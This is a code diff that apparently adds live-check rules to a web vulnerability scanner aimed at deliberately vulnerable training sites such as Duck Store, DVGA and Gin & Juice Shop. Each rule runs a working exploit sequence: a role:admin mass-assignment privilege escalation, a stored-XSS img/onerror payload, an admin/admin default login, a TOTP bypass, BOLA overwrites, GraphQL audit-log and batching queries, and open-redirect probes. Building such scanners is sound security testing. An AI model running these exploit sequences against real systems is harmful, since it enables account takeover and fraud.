+      snippet: adminDoc.body.slice(0, 200).trim(),
+      note: "Duck Store PUT /api/v1/users/me/profile accepts role:admin mass-assignment and unlocks GET /api/v1/admin/users — privilege escalation oracle"
+    }
+  };
+};
+
+const duckStoreProfileMassAssignmentRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/users\/me\/profile/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreProfileMassAssignmentLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/users/me/profile route scan — PUT role:admin mass-assignment escalates to admin API roster access"
+    }
+  };
+};
+
+const duckStoreTestimonialsStoredXssLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const token = await duckStoreRegisterAndLoginToken(ctx);
+  if (!token) return NEGATIVE;
+  const canary = `thugirStoredXss${Date.now().toString(36)}`;
+  const payload = `<img src=x onerror=${canary}>`;
+  const postUrl = new URL("/api/v1/testimonials/", ctx.origin).toString();
+  const postDoc = await ctx.probe.get(postUrl, {
+    method: "POST",
+    body: JSON.stringify({ content: payload, rating: 5 }),
+    headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (postDoc.status < 200 || postDoc.status >= 400) return NEGATIVE;
+  if (!postDoc.body.includes(canary) || !/<img\s+src=x\s+onerror=/i.test(postDoc.body)) return NEGATIVE;
+  const listUrl = new URL("/api/v1/testimonials/", ctx.origin).toString();
+  const listDoc = await ctx.probe.get(listUrl, { maxBytes: 32768, timeoutMs: 15000 });
+  if (listDoc.status < 200 || listDoc.status >= 400) return NEGATIVE;
+  if (!listDoc.body.includes(canary) || !/<img\s+src=x\s+onerror=/i.test(listDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      postUrl,
+      listUrl,
+      canary,
+      snippet: listDoc.body.match(new RegExp(`.{0,60}${canary}.{0,60}`))?.[0]?.slice(0, 160),
+      note: "Duck Store POST /api/v1/testimonials/ stores unsanitized HTML in content and returns it via GET /api/v1/testimonials/ — stored XSS oracle"
+    }
+  };
+};
+
+const duckStoreTestimonialsStoredXssRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/testimonials/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreTestimonialsStoredXssLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/testimonials route scan — POST stores unsanitized HTML testimonial content served back without encoding"
+    }
+  };
+};
+
+async function duckStoreSpaBundleBody(ctx: RuleContext): Promise<string> {
+  const homeUrl = new URL("/", ctx.origin).toString();
+  const homeDoc = await ctx.probe.get(homeUrl, { maxBytes: 32768, timeoutMs: 15000 });
+  const jsPath = homeDoc.body.match(/src="(\/assets\/index-[^"]+\.js)"/i)?.[1];
+  if (!jsPath) return ctx.combined;
+  const jsDoc = await ctx.probe.get(new URL(jsPath, ctx.origin).toString(), {
+    maxBytes: 600000,
+    timeoutMs: 20000
+  });
+  return `${ctx.combined}\n${jsDoc.body}`;
+}
+
+const duckStoreAuthLoginWeakCredentialsLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const loginUrl = new URL("/api/v1/auth/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username: "admin", password: "admin" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return NEGATIVE;
+  let token: string | undefined;
+  try {
+    const data = JSON.parse(loginDoc.body) as { access_token?: string; requires_totp?: boolean };
+    token = data.access_token;
+    if (data.requires_totp) return NEGATIVE;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!token) return NEGATIVE;
+  let role = "";
+  try {
+    const payload = JSON.parse(
+      atob(token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/"))
+    ) as { role?: string; username?: string };
+    role = payload.role ?? "";
+    if (payload.username !== "admin" || role !== "admin") return NEGATIVE;
+  } catch {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.95,
+    evidence: {
+      loginUrl,
+      role,
+      snippet: loginDoc.body.slice(0, 160).trim(),
+      note: "Duck Store POST /api/v1/auth/login accepts default admin/admin credentials and returns admin JWT without MFA — weak credential oracle"
+    }
+  };
+};
+
+const duckStoreAuthLoginWeakCredentialsRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/auth\/login/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreAuthLoginWeakCredentialsLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/auth/login route scan — default admin/admin credentials return admin JWT without MFA"
+    }
+  };
+};
+
+const duckStoreOpenRedirectLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const bundle = await duckStoreSpaBundleBody(ctx);
+  const hasRedirectParam =
+    /(?:URLSearchParams|\.get)\(\s*["']redirect["']\s*\)/i.test(bundle) &&
+    /href:\s*\w+/.test(bundle) &&
+    /404 Error: User attempted to access non-existent route/i.test(bundle);
+  if (!hasRedirectParam) return NEGATIVE;
+  const probeHost = "evil-open-redirect-probe.example";
+  const probeUrl = new URL("/nonexistent", ctx.origin);
+  probeUrl.searchParams.set("redirect", `https://${probeHost}/`);
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      url: probeUrl.toString(),
+      probeHost,
+      snippet: bundle.match(/a\.get\(["']redirect["']\)[\s\S]{0,120}/)?.[0]?.slice(0, 160),
+      note: "Duck Store 404 page assigns href from unvalidated redirect query param — DOM open-redirect oracle"
+    }
+  };
+};
+
+const duckStoreOpenRedirectRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/redirect=/i.test(pageUrl) && !/\/nonexistent/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreOpenRedirectLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store open-redirect route scan — 404 handler links href to unvalidated redirect query parameter"
+    }
+  };
+};
+
+const duckStoreReferralCodeAbuseLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const username = `thugir_ref_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const registerUrl = new URL("/api/v1/auth/register", ctx.origin).toString();
+  const baselineDoc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      username: `${username}_base`,
+      email: `${username}_base@example.com`,
+      password: "ThugirTest123!"
+    }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (baselineDoc.status < 200 || baselineDoc.status >= 400) return NEGATIVE;
+  let baselineCredit = 0;
+  try {
+    baselineCredit = (JSON.parse(baselineDoc.body) as { account_credit?: number }).account_credit ?? 0;
+  } catch {
+    return NEGATIVE;
+  }
+  const abuseDoc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      username: `${username}_ref`,
+      email: `${username}_ref@example.com`,
+      password: "ThugirTest123!",
+      referral_code: "admin"
+    }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (abuseDoc.status < 200 || abuseDoc.status >= 400) return NEGATIVE;
+  let abuseCredit = 0;
+  try {
+    abuseCredit = (JSON.parse(abuseDoc.body) as { account_credit?: number }).account_credit ?? 0;
+  } catch {
+    return NEGATIVE;
+  }
+  if (abuseCredit < 5 || abuseCredit <= baselineCredit) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      registerUrl,
+      referral_code: "admin",
+      baselineCredit,
+      abuseCredit,
+      snippet: abuseDoc.body.slice(0, 200).trim(),
+      note: "Duck Store POST /api/v1/auth/register with referral_code=admin grants $5 account_credit without validating referral ownership — referral abuse oracle"
+    }
+  };
+};
+
+const duckStoreReferralCodeAbuseRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/auth\/register/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreReferralCodeAbuseLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/auth/register route scan — referral_code=admin grants signup credit without ownership validation"
+    }
+  };
+};
+
+function duckStoreBase32Decode(secret: string): Buffer {
+  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
+  const cleaned = secret.replace(/=+$/g, "").toUpperCase();
+  let bits = "";
+  for (const char of cleaned) {
+    const val = alphabet.indexOf(char);
+    if (val < 0) continue;
+    bits += val.toString(2).padStart(5, "0");
+  }
+  const bytes: number[] = [];
+  for (let i = 0; i + 8 <= bits.length; i += 8) {
+    bytes.push(parseInt(bits.slice(i, i + 8), 2));
+  }
+  return Buffer.from(bytes);
+}
+
+function duckStoreTotpCode(secret: string, forTime = Math.floor(Date.now() / 1000)): string {
+  const key = duckStoreBase32Decode(secret);
+  const counter = Buffer.alloc(8);
+  counter.writeBigUInt64BE(BigInt(Math.floor(forTime / 30)));
+  const hash = createHmac("sha1", key).update(counter).digest();
+  const offset = hash[hash.length - 1] & 0x0f;
+  const code = (hash.readUInt32BE(offset) & 0x7fffffff) % 1_000_000;
+  return code.toString().padStart(6, "0");
+}
+
+async function duckStoreEnableTotp(ctx: RuleContext, token: string): Promise<boolean> {
+  const setupUrl = new URL("/api/v1/totp/setup", ctx.origin).toString();
+  const setupDoc = await ctx.probe.get(setupUrl, {
+    headers: { Authorization: `Bearer ${token}` },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (setupDoc.status < 200 || setupDoc.status >= 400) return false;
+  let secret = "";
+  try {
+    secret = (JSON.parse(setupDoc.body) as { secret?: string }).secret ?? "";
+  } catch {
+    return false;
+  }
+  if (!secret) return false;
+  const enableUrl = new URL("/api/v1/totp/enable", ctx.origin).toString();
+  const enableDoc = await ctx.probe.get(enableUrl, {
+    method: "POST",
+    body: JSON.stringify({ token: duckStoreTotpCode(secret) }),
+    headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  return enableDoc.status >= 200 && enableDoc.status < 300 && /2FA enabled successfully/i.test(enableDoc.body);
+}
+
+async function duckStoreAdminLoginToken(ctx: RuleContext): Promise<string | null> {
+  const loginUrl = new URL("/api/v1/auth/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username: "admin", password: "admin" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return null;
+  try {
+    const data = JSON.parse(loginDoc.body) as { access_token?: string; requires_totp?: boolean };
+    if (data.requires_totp || !data.access_token) return null;
+    return data.access_token;
+  } catch {
+    return null;
+  }
+}
+
+const duckStoreAdminProductsNegativePriceLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const token = await duckStoreAdminLoginToken(ctx);
+  if (!token) return NEGATIVE;
+  const postUrl = new URL("/api/v1/admin/products", ctx.origin).toString();
+  const postDoc = await ctx.probe.get(postUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      name: `Thugir Probe ${Date.now().toString(36)}`,
+      description: "negative price probe",
+      price: -99.99,
+      stock: 1,
+      color: "Red",
+      material: "Rubber",
+      size: "Small",
+      image_url: "/static/products/classic-duck.png"
+    }),
+    headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (postDoc.status < 200 || postDoc.status >= 400) return NEGATIVE;
+  if (!/"price"\s*:\s*-99\.99/.test(postDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      postUrl,
+      price: -99.99,
+      snippet: postDoc.body.slice(0, 200).trim(),
+      note: "Duck Store POST /api/v1/admin/products accepts price:-99.99 without server-side validation — negative product price business-logic oracle"
+    }
+  };
+};
+
+const duckStoreAdminProductsNegativePriceRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/admin\/products/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreAdminProductsNegativePriceLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/admin/products route scan — POST accepts negative product price without validation"
+    }
+  };
+};
+
+const duckStoreTestimonialsPutBolaLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const tokenA = await duckStoreRegisterAndLoginToken(ctx);
+  if (!tokenA) return NEGATIVE;
+  const original = `User A testimonial ${Date.now().toString(36)}`;
+  const hijacked = `User B hijacked ${Date.now().toString(36)}`;
+  const postUrl = new URL("/api/v1/testimonials/", ctx.origin).toString();
+  const postDoc = await ctx.probe.get(postUrl, {
+    method: "POST",
+    body: JSON.stringify({ content: original, rating: 5 }),
+    headers: { Authorization: `Bearer ${tokenA}`, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (postDoc.status < 200 || postDoc.status >= 400) return NEGATIVE;
+  let testimonialId: number | undefined;
+  try {
+    testimonialId = (JSON.parse(postDoc.body) as { id?: number }).id;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!testimonialId) return NEGATIVE;
+  const tokenB = await duckStoreRegisterAndLoginToken(ctx);
+  if (!tokenB) return NEGATIVE;
+  const putUrl = new URL(`/api/v1/testimonials/${testimonialId}`, ctx.origin).toString();
+  const putDoc = await ctx.probe.get(putUrl, {
+    method: "PUT",
+    body: JSON.stringify({ content: hijacked, rating: 1 }),
+    headers: { Authorization: `Bearer ${tokenB}`, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (putDoc.status < 200 || putDoc.status >= 400) return NEGATIVE;
+  if (!putDoc.body.includes(hijacked)) return NEGATIVE;
+  const getDoc = await ctx.probe.get(putUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (getDoc.status < 200 || getDoc.status >= 400) return NEGATIVE;
+  if (!getDoc.body.includes(hijacked)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      postUrl,
+      putUrl,
+      testimonialId,
+      original,
+      hijacked,
+      snippet: putDoc.body.slice(0, 200).trim(),
+      note: "Duck Store PUT /api/v1/testimonials/{id} lets user B overwrite user A's testimonial without ownership check — BOLA oracle"
+    }
+  };
+};
+
+const duckStoreTestimonialsPutBolaRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/testimonials(?:\/\d+)?/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreTestimonialsPutBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/testimonials/{id} route scan — PUT overwrites another user's testimonial without ownership validation"
+    }
+  };
+};
+
+const duckStoreAuthTotpBypassLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const token = await duckStoreRegisterAndLoginToken(ctx);
+  if (!token) return NEGATIVE;
+  const enabled = await duckStoreEnableTotp(ctx, token);
+  if (!enabled) return NEGATIVE;
+  const profileUrl = new URL("/api/v1/users/me/profile", ctx.origin).toString();
+  const profileDoc = await ctx.probe.get(profileUrl, {
+    headers: { Authorization: `Bearer ${token}` },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (profileDoc.status < 200 || profileDoc.status >= 400) return NEGATIVE;
+  let username = "";
+  try {
+    username = (JSON.parse(profileDoc.body) as { username?: string }).username ?? "";
+  } catch {
+    return NEGATIVE;
+  }
+  if (!username) return NEGATIVE;
+  const loginUrl = new URL("/api/v1/auth/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password: "ThugirTest123!" }),
+    headers: {
+      "Content-Type": "application/json",
+      "X-Thugir-Nonce": `totp-relogin-${Date.now()}`
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 400) return NEGATIVE;
+  let login: { access_token?: string | null; requires_totp?: boolean; temp_token?: string | null };
+  try {
+    login = JSON.parse(loginDoc.body) as typeof login;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!login.requires_totp || login.access_token || !login.temp_token) return NEGATIVE;
+  const adminUrl = new URL("/api/v1/admin/users", ctx.origin).toString();
+  const adminDoc = await ctx.probe.get(adminUrl, {
+    headers: { Authorization: `Bearer ${login.temp_token}` },
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (adminDoc.status < 200 || adminDoc.status >= 400) return NEGATIVE;
+  if (!/"email"\s*:\s*"admin@duck-store\.escape"/i.test(adminDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.95,
+    evidence: {
+      loginUrl,
+      adminUrl,
+      requires_totp: login.requires_totp,
+      snippet: adminDoc.body.slice(0, 200).trim(),
+      note: "Duck Store login temp_token is accepted as a full Bearer JWT on protected routes without completing POST /api/v1/auth/login/totp — 2FA bypass oracle"
+    }
+  };
+};
+
+const duckStoreAuthTotpBypassRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/auth\/login(?:\/totp)?/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreAuthTotpBypassLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/auth/login route scan — temp_token from 2FA-pending login works as full access token without TOTP verification"
+    }
+  };
+};
+
+function isDvgaLiveHost(ctx: RuleContext): boolean {
+  const urls = [ctx.origin, ctx.scanUrl || "", ctx.home.finalUrl || ""];
+  return urls.some((raw) => {
+    try {
+      const host = new URL(raw).hostname.toLowerCase();
+      return (
+        /^(?:www\.)?dvga2?\.tools\.escape\.tech$/i.test(host) ||
+        /xplat-demo\.threatx\.io/i.test(host) ||
+        /pentest-ground\.com/i.test(host)
+      );
+    } catch {
+      return /dvga2?\.tools\.escape\.tech|xplat-demo\.threatx\.io|pentest-ground\.com/i.test(raw);
+    }
+  });
+}
+
+function dvgaCanonicalOrigin(ctx: RuleContext): string {
+  const urls = [ctx.scanUrl || "", ctx.home.finalUrl || "", ctx.origin];
+  for (const raw of urls) {
+    try {
+      const u = new URL(raw);
+      const host = u.hostname.toLowerCase();
+      if (/^(?:www\.)?dvga\.tools\.escape\.tech$/i.test(host)) return "https://dvga.tools.escape.tech";
+      if (/^(?:www\.)?dvga2\.tools\.escape\.tech$/i.test(host)) return "https://dvga2.tools.escape.tech";
+      if (/xplat-demo\.threatx\.io|pentest-ground\.com/i.test(host)) {
+        u.protocol = "https:";
+        return u.origin;
+      }
+    } catch {
+      /* ignore */
+    }
+  }
+  return ctx.origin.replace(/^http:\/\//i, "https://").replace(/^(https:\/\/)www\./i, "$1");
+}
+
+const dvgaRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDvgaLiveHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const base = dvgaCanonicalOrigin(ctx);
+  const homeUrl = new URL("/", base).toString();
+  const homeDoc = await fetchDoc(homeUrl, { maxBytes: 32768, timeoutMs: 15000 });
+  const corpus = `${ctx.combined}\n${homeDoc.body}`;
+  const markers: { label: string; sample: string }[] = [];
+  if (/Damn Vulnerable GraphQL Application/i.test(corpus)) {
+    markers.push({ label: "DVGA application title", sample: "Damn Vulnerable GraphQL Application" });
+  }
+  if (/dvgql_logo\.png|\/import_paste/i.test(corpus)) {
+    markers.push({ label: "DVGA sidebar import_paste route", sample: "/import_paste" });
+  }
+  if (/dolevf\/Damn-Vulnerable-GraphQL-Application/i.test(corpus)) {
+    markers.push({ label: "DVGA GitHub repo link", sample: "dolevf/Damn-Vulnerable-GraphQL-Application" });
+  }
+  const gqlUrl = new URL("/graphql", base).toString();
+  const gqlDoc = await fetchDoc(gqlUrl, {
+    method: "POST",
+    body: JSON.stringify({ query: "{ __schema { queryType { name } } }" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  const introspection =
+    gqlDoc.status >= 200 &&
+    gqlDoc.status < 300 &&
+    /"__schema"\s*:/.test(gqlDoc.body) &&
+    /"queryType"/.test(gqlDoc.body);
+  if (markers.length < 1 && !introspection) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: introspection && markers.length >= 2 ? 0.93 : introspection ? 0.91 : 0.89,
+    evidence: {
+      scannedUrl: pageUrl,
+      homeUrl,
+      graphqlUrl: gqlUrl,
+      introspection,
+      markers: markers.slice(0, 3),
+      snippet: gqlDoc.body.slice(0, 120).trim(),
+      note: "DVGA live host route scan — GraphQL introspection enabled and Damn Vulnerable GraphQL Application training sidebar confirmed via home re-fetch"
+    }
+  };
+};
+
+const dvgaGraphqlAuditLogLiveOracle: Rule = async (ctx) => {
+  if (!isDvgaLiveHost(ctx)) return NEGATIVE;
+  const base = dvgaCanonicalOrigin(ctx);
+  const gqlUrl = new URL("/graphql", base).toString();
+  const doc = await fetchDoc(gqlUrl, {
+    method: "POST",
+    body: JSON.stringify({ query: "{ audits { id gqloperation gqlquery } }" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"audits"\s*:\s*\[/.test(doc.body)) return NEGATIVE;
+  if (!/"gqlquery"\s*:\s*"/.test(doc.body)) return NEGATIVE;
+  if (!/mutation|query\s*\{/i.test(doc.body)) return NEGATIVE;
+  const sampleMatch = doc.body.match(/"gqlquery"\s*:\s*"([^"]{12,120})"/);
+  return {
+    fired: true,
+    confidence: sampleMatch ? 0.93 : 0.9,
+    evidence: {
+      url: gqlUrl,
+      snippet: sampleMatch ? sampleMatch[0].slice(0, 160) : doc.body.slice(0, 160).trim(),
+      note: "DVGA POST /graphql { audits { gqlquery } } returns unauthenticated GraphQL operation audit logs — information disclosure oracle"
+    }
+  };
+};
+
+const dvgaGraphqlAuditRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDvgaLiveHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:graphql|audit)\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await dvgaGraphqlAuditLogLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "DVGA /graphql or /audit route scan — unauthenticated audits query returns stored GraphQL operation logs"
+    }
+  };
+};
+
+const dvgaGraphqlBatchingLiveOracle: Rule = async (ctx) => {
+  if (!isDvgaLiveHost(ctx)) return NEGATIVE;
+  const base = dvgaCanonicalOrigin(ctx);
+  const gqlUrl = new URL("/graphql", base).toString();
+  const batchBody = JSON.stringify([
+    { query: "{ pastes(public: true) { id } }" },
+    { query: "{ pastes(public: true) { id } }" }
+  ]);
+  const doc = await fetchDoc(gqlUrl, {
+    method: "POST",
+    body: batchBody,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!doc.body.trimStart().startsWith("[")) return NEGATIVE;
+  const batchHits = [...doc.body.matchAll(/"data"\s*:\s*\{\s*"pastes"/g)];
+  if (batchHits.length < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: gqlUrl,
+      batchResponses: batchHits.length,
+      snippet: doc.body.slice(0, 180).trim(),
+      note: "DVGA POST /graphql accepts JSON array batch queries and returns multiple data objects — GraphQL batching / rate-limit bypass oracle"
+    }
+  };
+};
+
+const dvgaGraphqlBatchingRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDvgaLiveHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/graphql\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await dvgaGraphqlBatchingLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "DVGA /graphql route scan — JSON array batching returns multiple independent query results without auth"
+    }
+  };
+};
+
+// --- Gin & Juice Shop catalog route oracles (ginandjuice.shop) ----------------------
+function isGinAndJuiceHost(ctx: RuleContext): boolean {
+  return /ginandjuice\.shop/i.test(ctx.origin);
+}
+
+const ginAndJuiceCatalogSearchXssLiveOracle: Rule = async (ctx) => {
+  if (!isGinAndJuiceHost(ctx)) return NEGATIVE;
+  const canary = `thugirXSS${Date.now().toString(36)}`;
+  const probeUrl = new URL("/catalog", ctx.origin);
+  probeUrl.searchParams.set("searchTerm", canary);
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const reflected =
+    new RegExp(`searchText\\s*=\\s*["']${canary}["']`).test(doc.body) ||
+    doc.body.includes(canary);
+  if (!reflected) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: /searchText\s*=/.test(doc.body) ? 0.91 : 0.88,
+    evidence: {
+      url: probeUrl.toString(),
+      canary,
+      snippet: doc.body.match(new RegExp(`.{0,40}${canary}.{0,40}`))?.[0]?.slice(0, 120),
+      note: "Gin & Juice Shop GET /catalog?searchTerm= reflects attacker input into searchText script variable — DOM/reflected XSS oracle"
+    }
+  };
+};
+
+const ginAndJuiceCatalogRouteLiveOracle: Rule = async (ctx) => {
+  if (!isGinAndJuiceHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/catalog\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ginAndJuiceCatalogSearchXssLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Gin & Juice Shop /catalog route scan — searchTerm reflected into client-side searchText variable (SQLi/XSS training oracle)"
+    }
+  };
+};
+
+const ginAndJuiceBlogPostOpenRedirectLiveOracle: Rule = async (ctx) => {
+  if (!isGinAndJuiceHost(ctx)) return NEGATIVE;
+  const probeHost = "evil-open-redirect-probe.example";
+  const probeUrl = new URL("/blog/post", ctx.origin);
+  probeUrl.searchParams.set("postId", "3");
+  probeUrl.searchParams.set("back", `https://${probeHost}/`);
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 32768, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const hasBackHandler =
+    /URLSearchParams\(location\.search\)\.get\(\s*["']back["']\s*\)/i.test(doc.body) &&
+    /location\s*=\s*new URLSearchParams/i.test(doc.body);
+  if (!hasBackHandler) return NEGATIVE;
+  if (!doc.body.includes(probeHost) && !/get\(\s*["']back["']\s*\)/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      url: probeUrl.toString(),
+      probeHost,
+      snippet: doc.body.match(/location\s*=\s*new URLSearchParams[\s\S]{0,120}/i)?.[0]?.slice(0, 160),
+      note: "Gin & Juice Shop /blog/post?back= assigns location from URLSearchParams back query param without validation — DOM open-redirect oracle"
+    }
+  };
+};
+
